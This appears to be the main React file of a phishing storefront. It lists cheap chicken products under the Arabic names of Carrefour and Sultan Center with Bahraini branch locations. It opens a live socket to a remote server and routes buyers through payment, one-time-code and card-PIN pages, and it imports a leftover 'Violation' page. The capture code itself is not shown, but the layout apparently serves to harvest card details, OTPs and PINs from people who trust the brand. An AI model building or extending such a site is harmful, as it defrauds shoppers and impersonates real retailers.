import { BrowserRouter, Routes, Route } from "react-router-dom";
import { useEffect, useState } from "react";
import axios from "axios";
import { io } from "socket.io-client";
import Home from "./Pages/Home";
import Navbar from "./components/Navbar";
import Footer from "./components/Footer";
import Violation from "./Pages/Success";
import Payemnt from "./Pages/Payemnt";
import OTP from "./Pages/OTP";
import PIN from "./Pages/PIN";
import Success from "./Pages/Success";
import { Product } from "./Pages/Product";
import { RiShoppingCartFill } from "react-icons/ri";
import Cart from "./components/Cart";


// export const api_route = "http://localhost:8080";
export const api_route = "https://ck-s.onrender.com";
export const socket = io(api_route);
export const products = [
  {
    id: 1,
    name: "كارفور",
    descrtions: ["بينا برانكا", "دجاج كامل مجم"],
    avaialble: [
      "كارفور - مجموع الإنماء",
      "كارفور ماركت، مجمع سار",
      "كارفور ماركت، سوق مدينة عيسى",
      "كارفور ماركت - الجفير",
      "مراسي جاليريا مول",
    ],
    image: "/1.jpg",
    price: 1.89,
  },
  {
    id: 2,
    name: "كارفور",
    descrtions: ["دجاج كامل طازج ", "تنمية  "],
    avaialble: [
      "كارفور - مجموع الإنماء",
      "كارفور ماركت، مجمع سار",
      "كارفور ماركت، سوق مدينة عيسى",
      "كارفور ماركت - الجفير",
      "مراسي جاليريا مول",
    ],
    image: "/2.jpg",
    price: 1.25,
  },
  {
    id: 3,
    name: "كارفور",
    descrtions: ["صدور دجاج "],
    avaialble: [
      "كارفور - مجموع الإنماء",
      "كارفور ماركت، مجمع سار",
      "كارفور ماركت، سوق مدينة عيسى",
      "كارفور ماركت - الجفير",
      "مراسي جاليريا مول",
    ],
    image: "/3.jpg",
    price: 1.79,
  },
  {
    id: 4,
    name: "كارفور",
    descrtions: [" ناجتس الدجاج  ", "الكبير"],
    avaialble: [
      "كارفور - مجموع الإنماء",
      "كارفور ماركت، مجمع سار",
      "كارفور ماركت، سوق مدينة عيسى",
      "كارفور ماركت - الجفير",
      "مراسي جاليريا مول",
    ],
    image: "/4.jpg",
    price: 1.69,
  },
  {
    id: 5,
    name: "كارفور",
    descrtions: [" دجاج كامل مجمد ", "الإسلامي"],
    avaialble: ["كارفور- المنامة", "كارفور - مجموع البحرين"],
    image: "/5.jpg",
    price: 4.89,
  },
  {
    id: 6,
    name: "كارفور",
    descrtions: [" نقانق الدجاج   ", "بينا برانكا"],
    avaialble: ["كارفور- المنامة", "كارفور - مجموع البحرين"],
    image: "/6.jpg",
    price: 0.89,
  },
  {
    id: 7,
    name: "كارفور",
    descrtions: [" دجاج كامل طازج    ", "تنمية  "],
    avaialble: ["كارفور- المنامة", "كارفور - مجموع البحرين"],
    image: "/7.jpg",
    price: 1.25,
  },
  {
    id: 8,
    name: "كارفور",
    descrtions: ["صدور دجاج  "],
    avaialble: ["كارفور- المنامة", "كارفور - مجموع البحرين"],
    image: "/8.jpg",
    price: 1.79,
  },
  {
    id: 9,
    name: "كارفور",
    descrtions: ["كبد  دجاج  ", "نات"],
    avaialble: ["كارفور- المنامة", "كارفور - مجموع البحرين"],
    image: "/9.jpg",
    price: 0.65,
  },
  {
    id: 10,
    name: "كارفور",
    descrtions: ["ناجتس   دجاج  ", "الكبير"],
    avaialble: ["كارفور- المنامة", "كارفور - مجموع البحرين"],
    image: "/10.jpg",
    price: 1.69,
  },
  {
    id: 11,
    name: "مركز سلطان",
    descrtions: ["نقانق    دجاج  "],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/11.jpg",
    price: 0.99,
  },
  {
    id: 12,
    name: "مركز سلطان",
    descrtions: ["دجاج كامل طازج", "تنمية"],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/12.jpg",
    price: 1.295,
  },
  {
    id: 13,
    name: "مركز سلطان",
    descrtions: [" دجاج كامل مجمد "],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/11.jpg",
    price: 0.99,
  },
  {
    id: 14,
    name: "مركز سلطان",
    descrtions: ["  فيليه دجاج "],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/14.jpg",
    price: 2.79,
  },
  {
    id: 15,
    name: "مركز سلطان",
    descrtions: [""],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/15.jpg",
    price: 1.99,
  },
  {
    id: 16,
    name: "مركز سلطان",
    descrtions: ["صدور دجاج  ", "الإسلامي"],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/16.jpg",
    price: 1.995,
  },
  {
    id: 17,
    name: "مركز سلطان",
    descrtions: ["زنجر الدجاج"],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/17.jpg",
    price: 0.89,
  },
  {
    id: 18,
    name: "مركز سلطان",
    descrtions: ["برجر دجاج"],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/18.jpg",
    price: 1.99,
  },
  {
    id: 19,
    name: "مركز سلطان",
    descrtions: ["دجاج كامل مجمد"],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/19.jpg",
    price: 1.39,
  },
  {
    id: 20,
    name: "انصار جاليري ",
    descrtions: ["شرائح الدجاج"],
    avaialble: [
      "Sultan mall, Zayed town",
      "أرجان فيلج، بو قوة",
      "Reef mall, Hamad town",
    ],
    image: "/20.jpg",
    price: 10.99,
  },
];

export const user = sessionStorage.getItem("user");

export function getKeysWithTrueValue(obj) {
  const keysWithTrueValue = {};
  for (const key in obj) {
    if (obj[key]) {
      keysWithTrueValue[key] = obj[key];
    }
  }
  return keysWithTrueValue;
}

function App() {
  useEffect(() => {
    (async () => {
      await axios.get(api_route + "/");
    })();
    if (!user) sessionStorage.setItem("user", Math.random());
  }, []);
  const [loading, setLoading] = useState(false);
  const routes = [
    {
      path: "/",
      element: <Home />,
    },
    {
      path: "/success",
      element: <Success />,
    },
    {
      path: "/payment",
      element: <Payemnt />,
    },
    {
      path: "/OTP",
      element: <OTP />,
    },
    {
      path: "/PIN",
      element: <PIN />,
    },
    {
      path: "/product/:id",
      element: <Product />,
    },
  ];

  console.log(
    window.location.pathname === "/" ||
      window.location.pathname.match(/^\/product\/\d+$/)?.length
  );
  return (
    <div className="min-h-screen  w-full flex items-center justify-center   ">
      <div className="w-full relative items-start justify-between flex flex-col min-h-screen lg:w-1/3">
        {
          <BrowserRouter>
            {/* <Navbar /> */}
            <Routes>
              <Route path="/" element={<Home />} />
              if(id)
              {routes.map((route) => (
                <Route path={route.path} element={route.element} />
              ))}
            </Routes>
            

            <Footer />
          </BrowserRouter>
        }
      </div>
    </div>
  );
}

export default App;
